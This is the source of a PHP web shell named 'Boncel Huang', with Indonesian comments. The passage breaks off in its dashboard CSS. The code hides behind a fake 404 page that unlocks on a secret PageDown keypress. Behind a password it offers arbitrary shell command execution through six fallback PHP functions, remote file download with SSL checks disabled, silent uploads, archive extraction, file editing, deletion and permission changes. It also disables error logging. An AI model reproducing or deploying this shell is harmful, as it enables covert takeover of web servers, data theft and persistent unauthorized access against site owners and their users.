<?php
/**
 * @author Shell Kakashi
 * @version 2.0
 * @description Advanced Web Shell with Anime Theme
 */

// Konfigurasi Autentikasi - Menggunakan HASH (password tidak terlihat)
// Untuk membuat hash baru, gunakan: password_hash('password_anda', PASSWORD_DEFAULT)
$valid_password_hash = '$2a$12$s1tSpKItA2EJCBVFROIytuLD7QoGqbvfI.EPWegThVewrs.oSaqrO'; // Hash untuk "password"

// Session Management
$session_name = 'Boncel_Huang_' . md5(__FILE__);
@session_name($session_name);
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// Security Bypass & Optimization
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('max_execution_time', '600');
@ini_set('memory_limit', '512M');
@ini_set('post_max_size', '500M');
@ini_set('upload_max_filesize', '500M');
@error_reporting(0);
@ignore_user_abort(true);
@set_time_limit(0);

// ========== TAMBAHAN HALAMAN 404 ==========
$shell_activated = isset($_COOKIE['shell_activated']) && $_COOKIE['shell_activated'] === 'true';

if (isset($_GET['activate'])) {
    setcookie('shell_activated', 'true', time() + 3600, '/');
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// CEK APAKAH SUDAH LOGIN
$is_logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// Tampilkan halaman 404 jika belum teraktivasi DAN belum login
if (!$shell_activated && !$is_logged_in) {
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html>
    <head><title>404 Not Found</title>
    <style>
        body{background:#0a0a0a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .err{text-align:center;}
        .err h1{font-size:120px;color:#ff4757;margin:0;}
        .err p{font-size:18px;color:#888;}
    </style>
    </head>
    <body>
        <div class="err">
            <h1>404</h1>
            <p>PAGE NOT FOUND</p>
        </div>
        <script>
            document.addEventListener("keydown", function(e){
                if(e.key === "PageDown"){
                    window.location.href = window.location.pathname + "?activate=1";
                }
            });
        </script>
    </body>
    </html>';
    exit;
}
// ========== AKHIR TAMBAHAN ==========

// Fungsi Utilitas
function getCurrentDir() {
    static $dir = null;
    if ($dir === null) {
        $dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
        if (!is_dir($dir)) $dir = getcwd();
        if (!is_dir($dir)) $dir = dirname(__FILE__);
        if (!is_dir($dir)) $dir = '.';
        $dir = str_replace('\\', '/', realpath($dir)) . '/';
    }
    return $dir;
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function sanitizeFilename($name) {
    $name = str_replace(['../', '..\\', './', '.\\'], '', $name);
    $name = preg_replace('/[^\w\-\.\(\)\s]/i', '_', $name);
    $name = preg_replace('/_+/', '_', $name);
    $name = trim($name, '._- ');
    if (empty($name)) $name = 'file_' . time();
    return $name;
}

// ========== TERMINAL YANG SUDAH DIPERBAIKI (LEBIH POWERFUL) ==========
function executeCommand($cmd, $cwd = null) {
    $cwd = $cwd ?: getCurrentDir();
    $cmd = trim($cmd);
    
    if (empty($cmd)) {
        return "";
    }
    
    // Handle cd command (change directory)
    if (preg_match('/^\s*cd\s+(.+)$/i', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        $fullPath = '';
        
        if ($newDir == '..') {
            $fullPath = dirname(rtrim($cwd, '/'));
        } elseif ($newDir == '.' || $newDir == './') {
            $fullPath = $cwd;
        } elseif ($newDir == '~' || $newDir == '~/') {
            $fullPath = $_SERVER['HOME'] ?? '/tmp';
        } elseif ($newDir[0] == '/') {
            $fullPath = $newDir;
        } else {
            $fullPath = $cwd . $newDir;
        }
        
        if (is_dir($fullPath)) {
            $_GET['d'] = $fullPath;
            return "✓ Directory changed to: " . realpath($fullPath);
        } else {
            return "✗ Directory not found: " . $newDir;
        }
    }
    
    // Handle download commands
    if (preg_match('/^(wget|curl)/i', $cmd)) {
        return handleDownload($cmd, $cwd);
    }
    
    // Support untuk berbagai command dengan multiple methods
    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' 2>/dev/null; ' . $cmd . ' 2>&1';
    $output = '';
    
    // Method 1: shell_exec
    if (function_exists('shell_exec')) {
        $output = @shell_exec($fullCmd);
    }
    
    // Method 2: exec
    if ($output === null && function_exists('exec')) {
        @exec($fullCmd, $out, $code);
        $output = implode("\n", $out);
        if ($code !== 0 && empty($output)) {
            $output = "Command executed with exit code: " . $code;
        }
    }
    
    // Method 3: system
    if (empty($output) && function_exists('system')) {
        ob_start();
        @system($fullCmd, $code);
        $output = ob_get_clean();
    }
    
    // Method 4: passthru
    if (empty($output) && function_exists('passthru')) {
        ob_start();
        @passthru($fullCmd, $code);
        $output = ob_get_clean();
    }
    
    // Method 5: proc_open (lebih advanced)
    if (empty($output) && function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($fullCmd, $descriptors, $pipes, $cwd);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if ($error && empty($output)) {
                $output = $error;
            }
        }
    }
    
    // Method 6: popen
    if (empty($output) && function_exists('popen')) {
        $handle = @popen($fullCmd, 'r');
        if ($handle) {
            $output = stream_get_contents($handle);
            pclose($handle);
        }
    }
    
    // Jika tetap kosong, coba perintah dasar
    if (empty($output) || $output === null) {
        if (function_exists('php_uname')) {
            $output = "Cannot execute command. Trying basic info:\nOS: " . php_uname();
        } else {
            $output = "Command execution not available on this server.";
        }
    }
    
    return trim($output);
}

function handleDownload($cmd, $cwd) {
    preg_match('/https?:\/\/[^\s]+/i', $cmd, $matches);
    $url = $matches[0] ?? '';
    
    if (!$url) {
        return "Error: No URL found in command";
    }
    
    $filename = null;
    if (preg_match('/-O\s+([^\s]+)/i', $cmd, $match)) {
        $filename = sanitizeFilename($match[1]);
    } elseif (preg_match('/-o\s+([^\s]+)/i', $cmd, $match)) {
        $filename = sanitizeFilename($match[1]);
    } else {
        $filename = sanitizeFilename(basename(parse_url($url, PHP_URL_PATH)));
        if (empty($filename)) $filename = 'downloaded_' . time() . '.bin';
    }
    
    $target = rtrim($cwd, '/') . '/' . $filename;
    $content = false;
    
    $context = stream_context_create([
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        'http' => ['timeout' => 60, 'user_agent' => 'Mozilla/5.0']
    ]);
    $content = @file_get_contents($url, false, $context);
    
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    if ($content !== false && file_put_contents($target, $content)) {
        @chmod($target, 0644);
        return "✅ Download successful: " . $filename . " (" . formatBytes(strlen($content)) . ")\nLocation: " . $target;
    }
    
    return "❌ Download failed: " . $url;
}

// ========== FUNGSI UPLOAD (TANPA NOTIFIKASI) ==========
function handleUpload($files, $targetDir) {
    if (isset($files['name']) && !is_array($files['name'])) {
        $files = [
            'name' => [$files['name']],
            'tmp_name' => [$files['tmp_name']],
            'error' => [$files['error']],
            'size' => [$files['size']]
        ];
    }
    
    foreach ($files['name'] as $i => $name) {
        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
            continue;
        }
        
        $cleanName = sanitizeFilename(basename($name));
        $target = rtrim($targetDir, '/') . '/' . $cleanName;
        
        if (!is_dir($targetDir)) {
            @mkdir($targetDir, 0755, true);
        }
        
        if (@move_uploaded_file($files['tmp_name'][$i], $target)) {
            @chmod($target, 0644);
        } elseif (@copy($files['tmp_name'][$i], $target)) {
            @unlink($files['tmp_name'][$i]);
            @chmod($target, 0644);
        }
    }
    
    // TIDAK ADA NOTIFIKASI UPLOAD
    return [];
}

function extractArchive($zipPath, $extractTo, $deleteAfter = true) {
    $results = [];
    
    if (!file_exists($zipPath)) {
        return ["❌ Archive not found: " . basename($zipPath)];
    }
    
    if (!is_dir($extractTo)) {
        @mkdir($extractTo, 0755, true);
    }
    
    $extracted = false;
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === TRUE) {
            if ($zip->extractTo($extractTo)) {
                $results[] = "✅ Extracted: " . $zip->numFiles . " files from " . basename($zipPath);
                $extracted = true;
            }
            $zip->close();
        }
    }
    
    if (!$extracted && function_exists('shell_exec')) {
        $cmd = 'cd "' . addslashes($extractTo) . '" && unzip -o "' . addslashes($zipPath) . '" 2>&1';
        $output = @shell_exec($cmd);
        if ($output && (strpos($output, 'inflating') !== false || strpos($output, 'extracting') !== false)) {
            $results[] = "✅ Extracted via command line: " . basename($zipPath);
            $extracted = true;
        }
    }
    
    if ($extracted && $deleteAfter) {
        @unlink($zipPath);
        $results[] = "🗑 Original archive deleted";
    } elseif (!$extracted) {
        $results[] = "❌ Failed to extract: " . basename($zipPath);
    }
    
    return $results;
}

// ========== AUTENTIKASI DENGAN HASH PASSWORD ==========
// PROSES LOGIN - Menggunakan password_hash verify
if (isset($_POST['password'])) {
    $input_password = $_POST['password'];
    if (password_verify($input_password, $valid_password_hash)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode(getcwd()));
        exit;
    } else {
        $login_error = "WRONG PASSWORD!";
    }
}

// CEK SESSION LOGIN
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // TAMPILKAN HALAMAN LOGIN
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔞 Boncel Huang </title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Grotesk:wght@300;400;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: radial-gradient(ellipse at center, #0a0e27 0%, #000000 100%);
            font-family: 'Space Grotesk', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        #particle-canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(rgba(0,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 1;
        }
        .glow-orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.5;
            animation: float 20s infinite ease-in-out;
            z-index: 0;
        }
        .orb-1 { width: 400px; height: 400px; background: radial-gradient(circle, #ff00ff, transparent); top: -200px; right: -100px; }
        .orb-2 { width: 500px; height: 500px; background: radial-gradient(circle, #00ffff, transparent); bottom: -250px; left: -150px; animation-delay: -5s; }
        .orb-3 { width: 300px; height: 300px; background: radial-gradient(circle, #ffaa00, transparent); top: 50%; left: 50%; transform: translate(-50%, -50%); animation-delay: -10s; opacity: 0.3; }
        @keyframes float {
            0%,100% { transform: translate(0,0) scale(1); }
            33% { transform: translate(30px,-30px) scale(1.1); }
            66% { transform: translate(-20px,20px) scale(0.9); }
        }
        .login-container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 500px;
            padding: 20px;
        }
        .cyber-card {
            background: rgba(10,20,40,0.6);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 50px 40px;
            border: 1px solid rgba(0,255,255,0.3);
            box-shadow: 0 0 40px rgba(0,255,255,0.2), inset 0 0 20px rgba(0,255,255,0.1);
            transition: all 0.4s;
        }
        .cyber-card:hover {
            transform: translateY(-10px) scale(1.02);
            border-color: rgba(0,255,255,0.8);
            box-shadow: 0 0 60px rgba(0,255,255,0.4);
        }
        .banner { text-align: center; margin-bottom: 40px; }
        .cyber-logo {
            width: 130px;
            height: 130px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 70px;
            box-shadow: 0 0 30px rgba(0,255,255,0.5);
            animation: pulse-glow 2s infinite;
            position: relative;
        }
        .cyber-logo::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border-radius: 50%;
            z-index: -1;
            opacity: 0.5;
            animation: rotate 3s linear infinite;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        @keyframes pulse-glow {
            0%,100% { box-shadow: 0 0 30px rgba(0,255,255,0.5); }
            50% { box-shadow: 0 0 60px rgba(0,255,255,0.8); }
        }
        h1 {
            font-family: 'Orbitron', monospace;
            font-size: 32px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        .subtitle { color: #88aaff; font-size: 12px; letter-spacing: 3px; text-transform: uppercase; }
        .input-group { margin-bottom: 25px; }
        .input-wrapper { position: relative; }
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: #00ffff;
            z-index: 1;
        }
        input {
            width: 100%;
            padding: 16px 20px 16px 50px;
            background: rgba(0,0,0,0.6);
            border: 1px solid rgba(0,255,255,0.3);
            border-radius: 20px;
            color: #fff;
            font-size: 16px;
            font-family: 'Space Grotesk', monospace;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #00ffff;
            box-shadow: 0 0 20px rgba(0,255,255,0.3);
            background: rgba(0,0,0,0.8);
        }
        input::placeholder { color: rgba(136,170,255,0.5); }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border: none;
            border-radius: 20px;
            color: #000;
            font-size: 18px;
            font-weight: bold;
            font-family: 'Orbitron', monospace;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            overflow: hidden;
        }
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        button:hover::before { left: 100%; }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 30px rgba(0,255,255,0.5);
        }
        .error-msg {
            background: rgba(255,71,87,0.2);
            border-left: 4px solid #ff4757;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 20px;
            color: #ff4757;
            text-align: center;
        }
        @media (max-width: 480px) {
            .cyber-card { padding: 30px 25px; }
            .cyber-logo { width: 90px; height: 90px; font-size: 50px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <canvas id="particle-canvas"></canvas>
    <div class="glow-orb orb-1"></div>
    <div class="glow-orb orb-2"></div>
    <div class="glow-orb orb-3"></div>
    
    <div class="login-container">
        <div class="cyber-card">
            <div class="banner">
                <div class="cyber-logo">⚡</div>
                <h1>Boncel Huang</h1>
                <div class="subtitle">🔥 NOTHING 🔥</div>
            </div>
            <form method="POST">
                <?php if (isset($login_error)): ?>
                <div class="error-msg">⚠️ <?php echo $login_error; ?></div>
                <?php endif; ?>
                <div class="input-group">
                    <div class="input-wrapper">
                        <div class="input-icon">🔑</div>
                        <input type="password" name="password" placeholder="ENTER PASSWORD" autofocus required>
                    </div>
                </div>
                <button type="submit">⟹ LOGIN ⟸</button>
            </form>
        </div>
    </div>
    
    <script>
        const canvas = document.getElementById('particle-canvas');
        const ctx = canvas.getContext('2d');
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.5;
                this.vy = (Math.random() - 0.5) * 0.5;
                this.size = Math.random() * 2;
                this.alpha = Math.random() * 0.5;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0) this.x = canvas.width;
                if (this.x > canvas.width) this.x = 0;
                if (this.y < 0) this.y = canvas.height;
                if (this.y > canvas.height) this.y = 0;
            }
            draw() { ctx.fillStyle = `rgba(0, 255, 255, ${this.alpha})`; ctx.fillRect(this.x, this.y, this.size, this.size); }
        }
        const particles = [];
        for (let i = 0; i < 100; i++) particles.push(new Particle());
        function animate() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(animate);
        }
        animate();
    </script>
</body>
</html>
    <?php
    exit;
}
// ========== AKHIR AUTENTIKASI ==========

// Main Dashboard
$currentDir = getCurrentDir();
$messages = isset($_SESSION['messages']) ? $_SESSION['messages'] : [];
$commandOutput = isset($_SESSION['command_output']) ? $_SESSION['command_output'] : '';

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create_action'])) {
        $name = sanitizeFilename($_POST['name'] ?? '');
        $type = $_POST['type'] ?? 'file';
        $content = $_POST['content'] ?? '';
        if ($name) {
            $path = $currentDir . $name;
            if ($type === 'file') {
                if (file_put_contents($path, $content)) { @chmod($path, 0644); $messages[] = "📄 File created: " . $name; }
                else { $messages[] = "❌ Failed to create file: " . $name; }
            } else {
                if (mkdir($path, 0755, true)) { $messages[] = "📁 Folder created: " . $name; }
                else { $messages[] = "❌ Failed to create folder: " . $name; }
            }
        }
    }
    
    // UPLOAD - TANPA NOTIFIKASI
    if (!empty($_FILES['files'])) {
        handleUpload($_FILES['files'], $currentDir);
        // NOTIFIKASI UPLOAD TIDAK DITAMPILKAN
    }
    
    if (!empty($_FILES['archive']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK) {
        $tmpPath = $_FILES['archive']['tmp_name'];
        $tempSave = $currentDir . 'temp_' . time() . '.zip';
        if (copy($tmpPath, $tempSave)) {
            $extractResults = extractArchive($tempSave, $currentDir, true);
            $messages = array_merge($messages, $extractResults);
        } else {
            $extractResults = extractArchive($tmpPath, $currentDir, false);
            $messages = array_merge($messages, $extractResults);
        }
    }
    
    if (isset($_POST['download_url']) && !empty($_POST['download_url'])) {
        $url = trim($_POST['download_url']);
        $filename = !empty($_POST['download_name']) ? sanitizeFilename($_POST['download_name']) : '';
        $cmd = 'wget ' . $url;
        if ($filename) $cmd .= ' -O ' . $filename;
        $result = handleDownload($cmd, $currentDir);
        $messages[] = $result;
    }
    
    if (isset($_POST['command']) && trim($_POST['command'])) {
        $commandOutput = executeCommand($_POST['command'], $currentDir);
    }
    
    if (isset($_POST['edit_content']) && isset($_POST['edit_file'])) {
        $target = $currentDir . basename($_POST['edit_file']);
        if (file_put_contents($target, $_POST['edit_content'])) {
            $messages[] = "💾 Saved: " . basename($target);
        }
    }
    
    if (isset($_POST['delete_selected']) && isset($_POST['selected_items'])) {
        $deleted = 0;
        foreach ($_POST['selected_items'] as $item) {
            $target = $currentDir . basename($item);
            if (file_exists($target)) {
                if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); }
                else { @unlink($target); }
                $deleted++;
            }
        }
        $messages[] = "🗑 Deleted " . $deleted . " item(s)";
    }
    
    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
        $old = $currentDir . basename($_POST['rename_old']);
        $new = $currentDir . sanitizeFilename($_POST['rename_new']);
        if (file_exists($old) && !file_exists($new) && rename($old, $new)) {
            $messages[] = "✏️ Renamed: " . basename($old) . " → " . basename($new);
        }
    }
    
    if (isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) {
        $target = $currentDir . basename($_POST['chmod_file']);
        $perms = octdec($_POST['chmod_value']);
        if (file_exists($target) && @chmod($target, $perms)) {
            $messages[] = "🔧 Changed permissions: " . basename($target) . " to " . $_POST['chmod_value'];
        }
    }
    
    $_SESSION['messages'] = $messages;
    $_SESSION['command_output'] = $commandOutput;
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
    exit;
}

// Handle GET operations
if (isset($_GET['delete'])) {
    $target = $currentDir . basename($_GET['delete']);
    if (file_exists($target)) {
        if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); }
        else { @unlink($target); }
        $messages[] = "🗑 Deleted: " . basename($target);
        $_SESSION['messages'] = $messages;
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
        exit;
    }
}

if (isset($_GET['extract'])) {
    $target = $currentDir . basename($_GET['extract']);
    if (file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        $results = extractArchive($target, $currentDir, true);
        $messages = array_merge($messages, $results);
        $_SESSION['messages'] = $messages;
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
        exit;
    }
}

if (isset($_GET['edit'])) {
    $editFile = basename($_GET['edit']);
    $editContent = @file_get_contents($currentDir . $editFile);
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$_SESSION['messages'] = $messages;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔞 Boncel Huang</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Grotesk:wght@300;400;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(ellipse at center, #0a0e27 0%, #000000 100%);
            font-family: 'Space Grotesk', sans-serif;
            color: #fff;
            min-height: 100vh;
        }
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: url('https://i.ibb.co/WNd84tts/photo-2026-04-17-05-14-00.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .bg-animation::before { display: none; }
        .cyber-header {
            background: rgba(10,20,40,0.8);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(0,255,255,0.3);
            padding: 20px 30px;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
        }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%,100% { box-shadow: 0 0 10px rgba(0,255,255,0.5); }
            50% { box-shadow: 0 0 25px rgba(0,255,255,0.8); }
        }
        .logo-text h1 {
            font-family: 'Orbitron', monospace;
            font-size: 24px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo-text p { font-size: 10px; color: #88aaff; letter-spacing: 2px; }
        .nav-buttons { display: flex; gap: 15px; }
        .cyber-btn {
            padding: 10px 20px;
            background: rgba(0,255,255,0.1);
            border: 1px solid rgba(0,255,255,0.3);
            border-radius: 12px;
            text-decoration: none;
            color: #00ffff;
            transition: all 0.3s;
            font-size: 14px;
        }
        .cyber-btn:hover {
            background: rgba(0,255,255,0.2);
            border-color: #00ffff;
            box-shadow: 0 0 15px rgba(0,255,255,0.3);
            transform: translateY(-2px);
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .dir-path {
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
            padding: 15px 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            border-left: 3px solid #00ffff;
            font-size: 14px;
        }
        .dir-path a { color: #00ffff; text-decoration: none; transition: all 0.3s; }
        .dir-path a:hover { text-shadow: 0 0 5px #00ffff; }
        .messages { margin-bottom: 20px; }
        .message {
            background: rgba(0,255,255,0.1);
            backdrop-filter: blur(10px);
            padding: 12px 20px;
            border-radius: 12px;
            margin-bottom: 10px;
            border-left: 4px solid #00ffff;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        /* ========== CARD FITUR DIPERKECIL ========== */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .cyber-card {
            background: rgba(10,20,40,0.6);
            backdrop-filter: blur(15px);
            border-radius: 16px;
            padding: 12px;
            border: 1px solid rgba(0,255,255,0.2);
            transition: all 0.4s;
        }
        .cyber-card:hover {
            transform: translateY(-3px);
            border-color: rgba(0,255,255,0.5);
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
        }
        .card-title {
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 6px;
            color: #00ffff;
        }
        .cyber-card input, .cyber-card textarea, .cyber-card select {
            width: 100%;
            padding: 6px 8px;
            margin-bottom: 8px;
            background: rgba(0,0,0,0.6);
            border: 1px solid rgba(0,255,255,0.3);
            border-radius: 8px;
            color: #fff;
            font-size: 11px;
            font-family: 'Space Grotesk', monospace;
        }
        .cyber-card textarea {
            font-size: 10px;
        }
        .cyber-card button {
            padding: 6px 12px;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 11px;
            width: 100%;
        }
        .cyber-card button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 10px rgba(0,255,255,0.4);
        }
        
        /* Style tabel */
        .file-table {
            background: rgba(10,20,40,0.6);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            overflow-x: auto;
            margin-bottom: 30px;
            border: 1px solid rgba(0,255,255,0.2);
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(0,255,255,0.1); }
        th {
            background: rgba(0,0,0,0.5);
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            color: #00ffff;
            letter-spacing: 1px;
        }
        tr:hover { background: rgba(0,255,255,0.05); }
        .file-name { display: flex; align-items: center; gap: 10px; }
        .folder-link { color: #00ffff; text-decoration: none; font-weight: bold; transition: all 0.3s; }
        .folder-link:hover { text-shadow: 0 0 5px #00ffff; }
        .file-link { color: #ffaa00; text-decoration: none; }
        .action-buttons { display: flex; gap: 8px; flex-wrap: wrap; }
        .action-btn {
            padding: 5px 12px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 11px;
            transition: all 0.3s;
            font-weight: bold;
        }
        .action-btn.edit { background: #00d4ff; color: #000; }
        .action-btn.delete { background: #ff4757; color: #fff; }
        .action-btn.extract { background: #00b894; color: #fff; }
        .action-btn.open { background: #6c5ce7; color: #fff; }
        .action-btn:hover { opacity: 0.8; transform: translateY(-1px); }
        
        .delete-selected-btn {
            margin: 15px;
            background: #ff4757;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        
        .terminal {
            background: #0a0a0a;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 30px;
            border: 1px solid rgba(0,255,255,0.3);
        }
        .terminal-header {
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            padding: 12px 20px;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            color: #000;
        }
        .terminal-output {
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            background: #000;
            color: #00ff00;
        }
        
        .editor {
            background: rgba(10,20,40,0.6);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 30px;
            border: 1px solid rgba(0,255,255,0.2);
        }
        .editor h3 { color: #00ffff; margin-bottom: 15px; }
        .editor textarea {
            width: 100%;
            height: 400px;
            background: #0a0a0a;
            border: 1px solid rgba(0,255,255,0.3);
            border-radius: 12px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 15px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(10px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: linear-gradient(135deg, #0a0e27 0%, #000000 100%);
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            border: 1px solid #00ffff;
            box-shadow: 0 0 30px rgba(0,255,255,0.3);
        }
        .modal-content h3 { color: #00ffff; margin-bottom: 20px; }
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            background: rgba(0,0,0,0.6);
            border: 1px solid #00ffff;
            border-radius: 8px;
            color: #fff;
        }
        .modal-content button {
            padding: 10px 20px;
